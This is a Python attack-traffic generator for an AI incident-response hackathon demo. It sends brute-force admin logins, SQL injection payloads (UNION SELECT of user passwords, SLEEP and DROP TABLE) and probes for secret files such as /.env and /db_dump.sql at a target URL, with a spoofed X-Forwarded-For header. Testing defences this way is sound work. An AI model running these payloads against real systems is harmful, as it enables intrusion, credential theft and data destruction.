#!/usr/bin/env python3
"""
=============================================================================
  🔥 KALI CLOUD ATTACKER - REAL-TIME ATTACK STREAM GENERATOR
=============================================================================
  Designed for AI Software Incident Response Hackathon Demonstration.
  
  Run this script on the Attacker Cloud VM (or local terminal) targeting the
  Victim Cloud VM.

  How the Live Demo Works:
  1. This script sends a continuous attack stream to the Victim Cloud server.
  2. While the AI Agent is dormant, requests leak through (HTTP 401/200).
  3. When you click [USE AGENT] or approve in Telegram, the Agent acts as a
     real-time wall: the server firewall blocks the IP immediately.
  4. This script instantly detects HTTP 403 Forbidden and alerts that the
     attack has been blocked cold!
=============================================================================
"""

import sys
import time
import json
import argparse
from datetime import datetime

# Ensure clean UTF-8 unbuffered output across Windows PowerShell and Linux Kali terminals
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace', line_buffering=True)
    except Exception:
        pass

import functools
import urllib.request
import urllib.error
import urllib.parse
import socket
print = functools.partial(print, flush=True)

try:
    import requests
    USE_REQUESTS = True
except ImportError:
    USE_REQUESTS = False

def get_real_public_ip() -> str:
    """Auto-detects the real external/public IP of this Cloud VM / machine."""
    services = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
        "https://ident.me",
    ]

    # Try requests first if available
    if USE_REQUESTS:
        for service_url in services:
            try:
                r = requests.get(service_url, headers={"User-Agent": "curl/7.68.0"}, timeout=2.5)
                if r.status_code == 200:
                    ip_str = r.text.strip()
                    parts = ip_str.split(".")
                    if len(parts) == 4 and all(p.isdigit() for p in parts):
                        return ip_str
            except Exception:
                continue

    # Fallback to standard library urllib
    for service_url in services:
        try:
            req = urllib.request.Request(service_url, headers={"User-Agent": "curl/7.68.0"})
            with urllib.request.urlopen(req, timeout=2.5) as resp:
                ip_str = resp.read().decode("utf-8").strip()
                parts = ip_str.split(".")
                if len(parts) == 4 and all(p.isdigit() for p in parts):
                    return ip_str
        except Exception:
            continue

    # Fallback to local network socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_str = s.getsockname()[0]
        s.close()
        return ip_str
    except Exception:
        return "119.235.52.196"

# ANSI Color Codes for Dramatic Terminal Output
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"

def get_timestamp() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def send_http_request(url: str, method: str = "GET", data: dict = None, headers: dict = None, timeout: float = 3.0):
    headers = headers or {}
    if USE_REQUESTS:
        try:
            if method.upper() == "POST":
                resp = requests.post(url, json=data, headers=headers, timeout=timeout)
            else:
                resp = requests.get(url, params=data, headers=headers, timeout=timeout)
            return resp.status_code, resp.text
        except requests.exceptions.RequestException as e:
            return 0, str(e)
    else:
        try:
            req_headers = {**headers, "Content-Type": "application/json"}
            if method.upper() == "POST":
                post_data = json.dumps(data).encode("utf-8") if data else b""
                req = urllib.request.Request(url, data=post_data, headers=req_headers, method="POST")
            else:
                query_str = f"?{urllib.parse.urlencode(data)}" if data else ""
                req = urllib.request.Request(f"{url}{query_str}", headers=req_headers, method="GET")

            with urllib.request.urlopen(req, timeout=timeout) as response:
                return response.status, response.read().decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", errors="ignore")
        except Exception as e:
            return 0, str(e)

def print_banner(target: str, mode: str, ip: str, delay: float):
    print(f"\n{RED}{BOLD}{'='*74}{RESET}")
    print(f"{RED}{BOLD}  🔥 KALI ATTACKER VM SIMULATOR [CLOUD-TO-CLOUD LIVE TESTBED]{RESET}")
    print(f"{WHITE}  Target Victim Cloud : {CYAN}{BOLD}{target}{RESET}")
    print(f"{WHITE}  Attack Vector       : {YELLOW}{BOLD}{mode.upper()}{RESET}")
    print(f"{WHITE}  Source / Spoofed IP : {MAGENTA}{BOLD}{ip}{RESET}")
    print(f"{WHITE}  Stream Rate         : {CYAN}1 packet every {delay}s{RESET}")
    print(f"{RED}{BOLD}{'='*74}{RESET}\n")
    print(f"{YELLOW}[*] Initializing socket connection to target host...{RESET}")
    time.sleep(0.6)
    print(f"{GREEN}[+] Connection established. Starting live exploit packet stream!{RESET}")
    print(f"{WHITE}[*] Watching for AI Agent Wall interception... (Press Ctrl+C to abort)\n{RESET}")

def run_attack(target: str, mode: str, source_ip: str, delay: float, loop: bool, max_count: int):
    target = target.rstrip("/")
    headers = {
        "X-Forwarded-For": source_ip,
        "User-Agent": "KaliLinux-Hydra/9.5 (Autonomous-Incident-Testbed)",
    }

    count = 0
    blocked_count = 0

    while True:
        count += 1
        ts = get_timestamp()

        # 1. Credential Brute Force Mode
        if mode == "brute":
            url = f"{target}/login"
            pwd = f"pass_dev_{count:03d}"
            payload = {"user": "admin", "password": pwd}
            status_code, body = send_http_request(url, method="POST", data=payload, headers=headers)
            endpoint_str = f"/login (admin:{pwd})"

        # 2. SQL Injection Mode
        elif mode == "sqli":
            url = f"{target}/search"
            sqli_payloads = [
                "1' OR '1'='1",
                "admin' --",
                "' UNION SELECT id, username, password FROM users --",
                "1' AND SLEEP(2)--",
                "'; DROP TABLE logs; --",
            ]
            q = sqli_payloads[(count - 1) % len(sqli_payloads)]
            status_code, body = send_http_request(url, method="GET", data={"q": q}, headers=headers)
            endpoint_str = f"/search?q={q[:25]}"

        # 3. Path Scanning Mode
        else:
            paths = ["/admin", "/.env", "/backup.zip", "/config.json", "/api/v1/keys", "/db_dump.sql"]
            p = paths[(count - 1) % len(paths)]
            url = f"{target}{p}"
            status_code, body = send_http_request(url, method="GET", headers=headers)
            endpoint_str = p

        # Evaluate response: Is the AI Agent Wall Active?
        if status_code == 403 or "Access Denied" in body or "blocked" in body.lower():
            blocked_count += 1
            if blocked_count == 1:
                print(f"\n{BG_RED}{WHITE}{BOLD}{'!'*74}{RESET}")
                print(f"{BG_RED}{WHITE}{BOLD}  [🛡️  AI AGENT WALL ENGAGED - ATTACK BLOCKED COLD IN REAL TIME]       {RESET}")
                print(f"{RED}{BOLD}  HTTP 403 FORBIDDEN: Access Denied! IP {source_ip} is in Firewall Blocklist.{RESET}")
                print(f"{YELLOW}  The Autonomous Incident Response Agent intercepted and severed the wire.{RESET}")
                print(f"{BG_RED}{WHITE}{BOLD}{'!'*74}{RESET}\n")

            print(f"[{ts}] {RED}{BOLD}[BLOCKED 403]{RESET} {endpoint_str} -> {RED}ACCESS DENIED BY AI AGENT WALL{RESET}")

        elif status_code in (401, 200):
            print(f"[{ts}] {YELLOW}[FLOWING {status_code}]{RESET} {endpoint_str} -> {CYAN}Unprotected Stream Active (Siphoning...){RESET}")
        elif status_code == 429:
            print(f"[{ts}] {MAGENTA}[RATE LIMITED 429]{RESET} {endpoint_str} -> {MAGENTA}Throttled by Agent Gating{RESET}")
        elif status_code == 500:
            print(f"[{ts}] {RED}[FAULT 500]{RESET} {endpoint_str} -> Internal server error")
        else:
            print(f"[{ts}] {WHITE}[STATUS {status_code}]{RESET} {endpoint_str} -> {body[:40]}")

        if not loop and count >= max_count:
            break

        time.sleep(delay)

def main():
    parser = argparse.ArgumentParser(description="Live Attacker VM Cloud-to-Cloud Stream Simulator")
    parser.add_argument("--target", default="http://127.0.0.1:8000", help="Target Victim Cloud URL (e.g. http://192.168.1.50:8000 or cloud IP)")
    parser.add_argument("--mode", choices=["brute", "sqli", "scan"], default="brute", help="Attack vector to simulate")
    parser.add_argument("--ip", default=None, help="Attacker source IP header (default: auto-detected real public IP)")
    parser.add_argument("--delay", type=float, default=0.25, help="Delay between attack packets in seconds (default: 0.25s)")
    parser.add_argument("--count", type=int, default=None, help="Number of packets to send (default: continuous stream)")
    parser.add_argument("--reset", action="store_true", help="Unblock the IP and reset the firewall before starting")

    args = parser.parse_args()

    # Auto-detect real public IP if not manually specified
    if not args.ip:
        print(f"{YELLOW}[*] Resolving real public IP address of this machine/VM...{RESET}")
        args.ip = get_real_public_ip()
        print(f"{GREEN}[+] Real Public IP detected: {BOLD}{args.ip}{RESET}")

    if args.reset:
        print(f"[*] Resetting victim firewall on {args.target}...")
        code, _ = send_http_request(f"{args.target.rstrip('/')}/internal/remediate/unblock_ip?ip={args.ip}", method="POST")
        print(f"[+] Firewall blocklist reset for {args.ip} (Status {code}).")

    print_banner(args.target, args.mode, args.ip, args.delay)

    is_loop = args.count is None

    try:
        run_attack(
            target=args.target,
            mode=args.mode,
            source_ip=args.ip,
            delay=args.delay,
            loop=is_loop,
            max_count=args.count or 1000000
        )
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Attack stopped by operator.{RESET}")

if __name__ == "__main__":
    main()
